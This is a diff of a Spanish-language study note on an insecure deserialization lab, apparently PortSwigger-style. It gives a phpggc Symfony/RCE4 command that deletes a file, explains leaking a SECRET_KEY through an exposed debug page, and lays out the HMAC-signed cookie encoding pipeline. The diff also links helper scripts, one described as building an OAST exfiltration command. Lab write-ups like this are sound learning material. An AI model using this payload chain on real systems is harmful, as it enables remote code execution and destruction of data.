@@ -22,7 +22,7 @@ tags:
 ```
 phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' -b
 ```
-`-b` = salida en **base64**. En el vault: [`PHP/gen-payload.ps1`](vulnerabilities/013-insecure_deserialization/PHP/gen-payload.ps1) (corre phpggc en Docker).
+`-b` = salida en **base64**. En el vault: [`scripts/PHP/gen_rce_oast.py`](vulnerabilities/013-insecure_deserialization/scripts/PHP/gen_rce_oast.py) (Python, arma el comando de exfil por OAST) o [`scripts/PHP/gen-payload.ps1`](vulnerabilities/013-insecure_deserialization/scripts/PHP/gen-payload.ps1) (PS, corre phpggc en Docker).
 
 ## Paso 2 — filtrar la SECRET_KEY
 La cookie va **firmada**; sin la clave, el server la rechaza. Se filtra en un debug expuesto:
@@ -33,7 +33,7 @@ La cookie es un JSON con el objeto y su **HMAC-SHA1**:
 
 > `{"token":"`==`<base64 de phpggc>`==`","sig_hmac_sha1":"`==`<hmac_sha1(token, SECRET_KEY)>`==`"}`
 
-Ese JSON completo → `base64` → `url-encode` → cookie. En el vault: [`PHP/sign-cookie.ps1`](vulnerabilities/013-insecure_deserialization/PHP/sign-cookie.ps1) hace la firma y el encoding final.
+Ese JSON completo → `base64` → `url-encode` → cookie. En el vault: [`scripts/PHP/sign-cookie.ps1`](vulnerabilities/013-insecure_deserialization/scripts/PHP/sign-cookie.ps1) hace la firma y el encoding final.
 
 ## El pipeline completo (lo importante)
 > `phpggc` **⟶** ==`base64`== (token) **⟶** `{"token":…,"sig_hmac_sha1":…}` **⟶** ==`base64`== **⟶** ==`url`== **⟶** cookie
